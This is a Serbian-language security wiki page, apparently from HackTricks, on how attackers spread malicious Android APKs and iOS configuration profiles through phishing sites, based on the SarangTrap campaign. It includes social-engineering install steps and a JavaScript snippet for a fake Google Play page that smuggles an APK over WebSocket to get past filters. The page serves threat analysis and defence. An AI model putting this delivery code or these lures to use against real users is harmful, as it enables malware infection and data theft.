# Mobilni Phishing i distribucija zlonamernih aplikacija (Android i iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ova stranica obrađuje tehnike koje threat actor-i koriste za distribuciju **zlonamernih Android APK-ova** i **iOS mobilnih konfiguracionih profila** putem phishinga (SEO, social engineering, lažne prodavnice, dating aplikacije itd.).
> Materijal je prilagođen na osnovu SarangTrap kampanje koju je otkrio Zimperium zLabs (2025) i drugih javno dostupnih istraživanja.<sup>[[1]](#references)</sup>

## Tok napada

1. **SEO/Phishing infrastruktura**
* Registrovanje desetina domena koji liče na legitimne domene (dating, cloud share, servis za automobile…).
– Korišćenje ključnih reči na lokalnom jeziku i emoji-ja u elementu `<title>` radi boljeg rangiranja na Google-u.
– Hostovanje uputstava za instalaciju i Android (`.apk`) i iOS aplikacija na istoj landing stranici.
2. **Preuzimanje prve faze**
* Android: direktan link ka *nepotpisanom* APK-u ili APK-u sa „third-party store-a“.
* iOS: `itms-services://` ili običan HTTPS link ka zlonamernom **mobileconfig** profilu (pogledajte u nastavku).
3. **Ponašanje Android malware-a nakon instalacije**
* Izvršavanje kontrolisano preko C2-a, zloupotreba dozvola, zaobilaženje dropper zaštita, prikupljanje podataka u pozadini i druge post-install malware aktivnosti obrađeni su na namenskoj Android Malware Post-Exploitation stranici u nastavku.
4. **iOS tehnika isporuke**
* Jedan **mobile-configuration profile** može zahtevati `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` itd. kako bi se uređaj upisao u nadzor sličan „MDM“-u.
* Uputstva zasnovana na social engineering-u:
1. Otvorite Settings ➜ *Profile downloaded*.
2. Dodirnite *Install* tri puta (screenshot-ovi se prikazuju na phishing stranici).
3. Verujte nepotpisanom profilu ➜ attacker dobija entitlement-e za *Contacts* i *Photo* bez provere u App Store-u.
5. **iOS Web Clip payload (ikona phishing aplikacije)**
* `com.apple.webClip.managed` payload-i mogu **zakačiti phishing URL na Home Screen** sa brendiranom ikonom/nazivom.
* Web Clip-ovi mogu da rade **preko celog ekrana** (skrivaju UI browsera) i mogu biti označeni kao **neuklonjivi**, što žrtvu primorava da obriše profil kako bi uklonila ikonu.<sup>[[3]](#references)</sup>
6. **Mrežni sloj**
* Običan HTTP, često na portu 80 sa HOST header-om kao što je `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (bez TLS-a → lako uočljivo).

## Android Malware Post-Exploitation

Za Android malware tradecraft nakon instalacije, kao što su C2, zloupotreba Accessibility funkcija, overlays, ATS automatizacija, učitavanje staged DEX-a, premium SMS i persistence, pogledajte:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## APK Smuggling zasnovan na Socket.IO/WebSocket-u i lažne Google Play stranice

Attackers sve češće zamenjuju statične APK linkove Socket.IO/WebSocket kanalom ugrađenim u mamce koji izgledaju kao Google Play stranice. Ovo prikriva URL payload-a, zaobilazi URL/extension filtere i zadržava realistično iskustvo instalacije.<sup>[[2]](#references)[[4]](#references)</sup>

Tipičan tok klijenta zabeležen u praksi:

<details>
<summary>Lažni Play downloader zasnovan na Socket.IO-u (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Zašto izbegava jednostavne kontrole:
- Nijedan statički APK URL nije izložen; payload se rekonstruiše u memoriji iz WebSocket frejmova.
- URL/MIME/extension filteri koji blokiraju direktne .apk odgovore mogu propustiti binarne podatke tunelovane putem WebSockets/Socket.IO.
- Crawleri i URL sandboxi koji ne izvršavaju WebSockets neće preuzeti payload.

Pogledajte i WebSocket tradecraft i alate:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Mračna strana romanse: SarangTrap iznudaška kampanja](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Podešavanja Web Clips payloada za Apple uređaje](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Bankarski trojanac usmeren na korisnike Androida u Indoneziji i Vijetnamu](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
